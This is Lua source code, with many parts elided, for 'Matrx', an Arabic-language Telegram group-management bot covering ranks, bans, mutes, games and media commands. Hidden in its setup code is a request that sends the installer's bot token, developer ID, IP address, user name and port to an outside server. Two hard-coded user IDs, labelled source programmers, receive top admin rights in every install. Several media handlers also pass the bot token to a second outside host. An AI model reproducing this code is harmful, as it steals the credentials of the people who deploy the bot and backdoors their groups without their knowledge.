...
--   This Is The Source Channel @FZOFZ .   --
--                - Matrx -                 --
--        -- https://t.me/FZOFZ --         --
------------------------------------------------ 
...
if not DevRio:get(Server.."IdMatrx") then 
...
DevRio:set(Server.."IdMatrx",DevId) 
end ---ifok
else 
...
if not DevRio:get(Server.."TokenMatrx") then 
...
DevRio:set(Server.."TokenMatrx",TokenBot) 
end  
else 
...
Config = {
DevId = DevRio:get(Server.."IdMatrx"),
TokenBot = DevRio:get(Server.."TokenMatrx"),
Matrx = DevRio:get(Server.."TokenMatrx"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdMatrx")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdMatrx").."&TokenBot="..DevRio:get(Server.."TokenMatrx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("Matrx.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Matrx
token="]]..DevRio:get(Server.."TokenMatrx")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
f:close() 
DevRio:del(Server.."IdMatrx");DevRio:del(Server.."TokenMatrx")
end 
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,1558668590,2075590328}
Matrx = Config.Matrx
TokenBot = Config.TokenBot
NameBot = (DevRio:get(Matrx..'Rio:NameBot') or 'ماتركس')
--     Source Matrx     --
...
local Status = DevRio:sismember(Matrx..'Rio:RioSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:SecondSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:SudoBot:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:RioSudoGp:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
local Status = DevRio:sismember(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:SudoBotGp:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = DevRio:sismember(Matrx..'Rio:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(Matrx..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(Matrx..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Matrx..'Rio:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBotGp(msg) or SecondSudo(msg) or RioSudoGp(msg) or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if DevRio:sismember(Matrx..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Matrx..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Matrx..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Matrx..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
...
if File_Name ~= "Matrx.lua" then 
send(chat,msg.id_," ᥀︙هذا الملف ليس تابع لسورس ماتركس")
return false 
end      
...
vardump(JsonInfo)
DevRio:set(Matrx.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(Matrx.."Rio:Groups",IdGps) 
DevRio:set(Matrx.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(Matrx.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevRio:set(Matrx..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(Matrx..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(Matrx..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(Matrx..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(Matrx..'Rio:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevRio:sadd(Matrx..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(Matrx..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(Matrx.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(Matrx.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
...
--     Source Matrx     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then MatrxTeam  = "المطور" elseif RioSudo(msg) then MatrxTeam = "المطور" elseif SecondSudo(msg) then MatrxTeam = "المطور" elseif SudoBot(msg) then MatrxTeam = "المطور" elseif Manager(msg) then MatrxTeam = "المدير" elseif Admin(msg) then MatrxTeam = "الادمن" else MatrxTeam = "العضو" end return MatrxTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then MatrxTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(2075590328) then MatrxTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Matrx) then MatrxTeam = 'البوت' elseif SudoId(user_id) then MatrxTeam = 'المطور الاساسي' elseif DevRio:sismember(Matrx..'Rio:RioSudo:', user_id) then MatrxTeam = 'المطور الاساسي' elseif DevRio:sismember(Matrx..'Rio:SecondSudo:', user_id) then MatrxTeam = 'المطور الاساسي²' elseif DevRio:sismember(Matrx..'Rio:SudoBot:', user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Matrx..'Rio:RioSudoGp:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:RioSudoGp:Rd"..chat_id) or 'مطور اساسي المجموعه' elseif DevRio:sismember(Matrx..'Rio:SecondSudoGp:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:SecondSudoGp:Rd"..chat_id) or 'ثانوي المجموعه' elseif DevRio:sismember(Matrx..'Rio:SudoBotGp:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:SudoBotGp:Rd"..chat_id) or 'مطور المجموعه' elseif DevRio:sismember(Matrx..'Rio:Owner:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:Owner:Rd"..chat_id) or 'المالك' elseif DevRio:sismember(Matrx..'Rio:RioConstructor:'..chat_id, user_id) then MatrxTeam = 'المالك' elseif DevRio:sismember(Matrx..'Rio:BasicConstructor:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Matrx..'Rio:Constructor:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Matrx..'Rio:Managers:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Matrx..'Rio:Admins:'..chat_id, user_id) then MatrxTeam = DevRio:get(Matrx.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Matrx..'Rio:VipMem:'..chat_id, user_id) then  MatrxTeam = DevRio:get(Matrx.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Matrx..'Rio:Cleaner:'..chat_id, user_id) then  MatrxTeam = DevRio:get(Matrx.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else MatrxTeam = DevRio:get(Matrx.."Rio:mem:Rd"..chat_id) or 'العضو' end return MatrxTeam end
--     Source Matrx     --
...
var = true
elseif DevRio:sismember(Matrx..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(Matrx..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(Matrx..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(Matrx..'Rio:RioSudoGp:', user_id) then
var = true 
elseif DevRio:sismember(Matrx..'Rio:SecondSudoGp:', user_id) then
var = true 
elseif DevRio:sismember(Matrx..'Rio:SudoBotGp:', user_id) then
var = true 
elseif DevRio:sismember(Matrx..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Matrx..'Rio:Owner:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Matrx..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Matrx..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Matrx..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Matrx..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Matrx..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local rio = (Matrx..'Rio:Filters:'..msg.chat_id_)
if rio then
...
local UserName = (dp.username_ or "FZOFZ")
...
--     Source Matrx     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevRio:get(Matrx..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Matrx     --
function ChCheck(msg)
local var = true 
if DevRio:get(Matrx.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(Matrx..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(Matrx..'Rio:ChText') then
local ChText = DevRio:get(Matrx..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(Matrx.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevRio:get(Matrx..'yes'..data.sender_user_id_) == 'delyes' then
DevRio:del(Matrx..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Matrx..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevRio:get(Matrx..'no'..data.sender_user_id_) == 'delno' then
DevRio:del(Matrx..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Matrx..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source Matrx     --
if DataText == '/yesdel' and DevRio:get(Matrx..'yesdel'..data.sender_user_id_) == 'delyes' then
DevRio:del(Matrx..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Matrx..'nodel'..data.sender_user_id_, 'delno')
if DevRio:sismember(Matrx..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(Matrx..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevRio:sismember(Matrx..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(Matrx..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(Matrx..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevRio:sismember(Matrx..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevRio:sismember(Matrx..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Matrx..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Matrx..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Matrx..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Matrx..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Matrx..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevRio:srem(Matrx..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Matrx..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Matrx..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Matrx..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Matrx..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Matrx..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
--     Source Matrx     --
if DevRio:get(Matrx.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevRio:del(Matrx.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevRio:get(Matrx.."Rio:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevRio:get(Matrx..'nodel'..data.sender_user_id_) == 'delno' then
DevRio:del(Matrx..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Matrx..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevRio:get(Matrx.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevRio:smembers(Matrx..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevRio:incrby(Matrx..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevRio:del(Matrx..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Matrx.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevRio:del(Matrx..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Matrx.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevRio:del(Matrx.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevRio:sismember(Matrx..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Matrx..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('http://ccccxcc.ml/Matrx/YtMatrx.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('http://ccccxcc.ml/Matrx/YtMatrx.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('http://ccccxcc.ml/Matrx/YtMatrx.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('http://ccccxcc.ml/Matrx/YtMatrx.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙الكلمه ↫ "..Rio.." تم حذفها") 
DevRio:del(Matrx..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:srem(Matrx..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Matrx..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevRio:get(Matrx..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevRio:del(Matrx..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevRio:del(Matrx..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:del(Matrx..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Matrx..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
DevRio:del(Matrx..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:srem(Matrx..'Rio:Sudo:Kt'..data.chat_id_,Rio)
end
...
local List = DevRio:smembers(Matrx..'Rio:Text:KtTexts'..Rio..data.chat_id_)
if DevRio:get(Matrx..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الاسئله للامر ↫ "..Rio) 
DevRio:del(Matrx..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
end
...
DevRio:del(Matrx..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
DevRio:del(Matrx..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:del(Matrx..'Rio:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Matrx..'Rio:Sudo:Kt'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/Song:"..data.sender_user_id_}},{{text="• TeAm Matrx • •",url="t.me/FZOFZ"}}} 
...
local Text ='*᥀︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/mp3:"..data.sender_user_id_}},{{text="• TeAm Matrx • •",url="t.me/FZOFZ"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/memz:"..data.sender_user_id_}},{{text="• TeAm Matrx • •",url="t.me/FZOFZ"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/gif:"..data.sender_user_id_}},{{text="• TeAm Matrx • •",url="t.me/FZOFZ"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/photo:"..data.sender_user_id_}},{{text="• TeAm Matrx • •",url="t.me/FZOFZ"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/anime:"..data.sender_user_id_}},{{text="• TeAm Matrx • •",url="t.me/FZOFZ"}}} 
...
DevRio:sadd(Matrx..'Rio:VipMem:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'᥀︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'FZOFZ')..')\n᥀︙تم رفعه في قائمة المميزين')
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:RioConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Matrx..'Rio:RioSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:VipMem:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:RioConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:RioSudo:'..data.chat_id_,dp.id_)
...
DevRio:sadd(Matrx..'Rio:Ban:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'᥀︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'FZOFZ')..')\n᥀︙تم حظره')
end
end
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:Ban:'..data.chat_id_,dp.id_)
...
if DevRio:sismember(Matrx..'Rio:Muted:'..data.chat_id_, dp.id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Matrx..'Rio:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'᥀︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'FZOFZ')..')\n᥀︙تم كتمه')
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'᥀︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'FZOFZ')..')\n᥀︙تم الغاء كتمه')
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Matrx..'Rio:BanAll:', dp.id_)
DevRio:srem(Matrx..'Rio:MuteAll:', dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'᥀︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'FZOFZ')..')\n᥀︙تم الغاء العام')
end,nil)
end
...
DevRio:sadd(Matrx..'Rio:Tkeed:'..data.chat_id_, dp.id_)
...
DevRio:srem(Matrx..'Rio:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'᥀︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'FZOFZ')..')\n᥀︙تم الغاء تقيده')
end,nil)
end
--     Source Matrx     --
...
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="• تنزيل مالك •",callback_data=data.sender_user_id_..":RemOwner:"..Rio},{text="• تنزيل مطور •",callback_data=data.sender_user_id_..":RemSudoBot:"..Rio}},{{text="• تنزيل مطور ثانوي •",callback_data=data.sender_user_id_..":RemSecondSudo:"..Rio},{text="• تنزيل مطور اساسي •",callback_data=data.sender_user_id_..":RemRioSudo:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif RioSudo(data) then
keyboard.inline_keyboard = {{{text="• تنزيل مميز •",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="• تنزيل ادمن •",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="• تنزيل منشئ •",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="• تنزيل مدير •",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="• تنزيل منظف •",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="• تنزيل منشئ  اساسي •",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="• تنزيل مالك •",callback_data=data.sender_user_id_..":RemOwner:"..Rio},{text="• تنزيل مطور •",callback_data=data.sender_user_id_..":RemSudoBot:"..Rio}},{{text="• تنزيل مطور ثانوي •",callback_data=data.sender_user_id_..":RemSecondSudo:"..Rio}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
elseif SecondSudo(data) then
